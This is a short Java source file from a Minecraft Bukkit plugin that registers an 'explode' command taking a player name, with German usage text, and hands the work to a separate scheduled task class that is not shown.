package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Command_Explode extends CommandBase {

    public Command_Explode() {
        super("explode", "<Spieler>" + " §d| " + ChatColor.GRAY + "Explodiert", Category.WORLD);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Bukkit.getScheduler().runTask(Start.INSTANCE, new Command_Explode2(this, args, p));
            } catch (Exception ignored) {
            }
        }
    }

}
